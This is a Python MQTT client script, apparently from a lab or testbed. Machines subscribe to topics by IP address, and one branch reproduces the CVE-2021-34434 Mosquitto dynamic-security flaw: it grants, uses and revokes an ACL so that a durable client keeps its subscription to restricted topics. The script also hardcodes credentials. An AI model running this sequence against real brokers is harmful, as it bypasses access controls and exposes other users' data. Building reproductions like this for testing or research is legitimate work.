import paho.mqtt.client as mqtt
import time
import mqtt_utilities as util

# Define topic lists for different IP addresses
USERNAME = "client"
PASSWORD = "pass"


def on_message(client, userdata, msg):
    print(f"topic: {msg.topic}  -  message: {msg.payload.decode()}", flush=True)


# Main function
def main():
    # Get the machine's IP address
    time.sleep(40)
    ip_address = util.get_ip()
    if not ip_address:
        print("Unable to determine system IP address. Exiting.")
        return
    ip_fourth_byte = int(ip_address.split(".")[-1])
    if ip_fourth_byte > 20:
        suffix = str(int(str(ip_fourth_byte)[-1]) + 1)
        print(f"Machine IP address: {ip_address}")

        # Determine the list of topics for this IP
        topics = util.TOPIC_MAP.get(ip_address, None)
        if not topics:
            print(f"No topics configured for this IP: {ip_address}. Exiting.")
            return
        # Initialize MQTT client
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv311)
        # client.username_pw_set("#", "your_password")  # Replace with the wildcard user's password
        client.on_connect = util.on_connect
        client.on_message = on_message
        client.on_connect = util.on_connect
        client.on_disconnect = util.on_disconnect
        client.username_pw_set(USERNAME + suffix, PASSWORD + suffix)

        # Connect to the MQTT broker
        if util.connect_client_v3(client, timeout=600):
            print("Beginning to subscribe to intended topics", flush=True)
            for topic in topics:
                client.subscribe(topic, qos=2)
                print(f"Subscribed to topic: {topic}", flush=True)
            print("Beginning to process messages", flush=True)
            time.sleep(1000)
        else:
            print(f"Timed out when trying to connect to the broker", flush=True)

    elif ip_fourth_byte == 20:
        # The machine with ip 10.0.0.20 is a durable client vulnerable to CVE-2021-34434 exploit due to a specific sequence of dynsec management operations.
        a_username = "myadmin"
        a_password = "pass123"
        reconnect_delay = 10
        # send message to $CONTROL/dynamic-security/v1 topic to change ACLs for client1
        print("Connecting to broker as admin to add acls for client1...", flush=True)
        not_reachable = True
        admin_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv311)
        admin_client.username_pw_set(a_username, a_password)
        admin_client.on_connect = util.on_connect
        admin_client.on_disconnect = util.on_disconnect
        admin_client.on_publish = util.on_publish

        # initialize the durable client
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                             client_id="durable_client", clean_session=False, protocol=mqtt.MQTTv311)
        client.username_pw_set("client1", "pass1")
        client.on_connect = util.on_connect
        client.on_subscribe = util.on_subscribe
        client.on_unsubscribe = util.on_unsubscribe
        client.on_message = on_message
        client.on_disconnect = util.on_disconnect

        if util.connect_client_v3(admin_client, reconnection_delay=reconnect_delay, timeout=600):
            print(
                "Sending admin message to add new ACLs for client1...", flush=True)
            admin_client.publish("$CONTROL/dynamic-security/v1",
                                 '{"commands": [{"command": "addRoleACL", "rolename": "roleClient1", "acltype": "subscribePattern", \
                                 "topic": "Building4/#", "priority": 1, "allow": true}]}')
            time.sleep(3)
        else:
            print("Timed out when trying to connect admin_client to the broker", flush=True)
            return

        # connect the durable client to the broker
        print("Connecting client1 to the broker...", flush=True)
        if util.connect_client_v3(client, reconnection_delay=reconnect_delay, timeout=600):

            # the durable clients subscribes to the desired topics and then disconnects
            print("Subscribing client1 to every accessible topic...", flush=True)
            for topic in util.TOPIC_MAP["10.0.0.20"]:
                res1 = client.subscribe(topic, qos=2)
                print(f"Sent subscription request for topic {topic}, mid {res1[1]}", flush=True)
            for topic in util.TOPIC_MAP["10.0.0.23"]:
                res2 = client.subscribe(topic, qos=2)
                print(f"Sent subscription request for topic {topic}, mid {res1[1]}", flush=True)
            time.sleep(3)
            print("Disconnecting client1 from the broker...", flush=True)
            client.disconnect()
            time.sleep(3)

            # revoke the subscribe permissions when the durable client is disconnected
            print(
                "Sending admin message to remove the newly added ACLs for client1...", flush=True)
            admin_client.publish("$CONTROL/dynamic-security/v1",
                                 '{"commands": [{"command": "removeRoleACL", "rolename": "roleClient1", "acltype": "subscribePattern", "topic": "Building4/#"}]}')
            time.sleep(3)
            print("Disconnecting admin...", flush=True)
            admin_client.disconnect()
            time.sleep(3)

            # reconnect the durable client
            print("Reconnecting client1 to the broker...", flush=True)
            if util.connect_client_v3(client, reconnection_delay=reconnect_delay):
                print("Beginning to process messages", flush=True)
                # remove the previous dynsec command or change it to not affect the client and add subscribe to restricted_topic if mosquitto version is not affected by vulnerability
                time.sleep(1000)
            else:
                print(
                    "Timed out when reconnecting client1 to the broker", flush=True)
        else:
            print("Timed out when trying to connect client1 to the broker", flush=True)


if __name__ == "__main__":
    main()
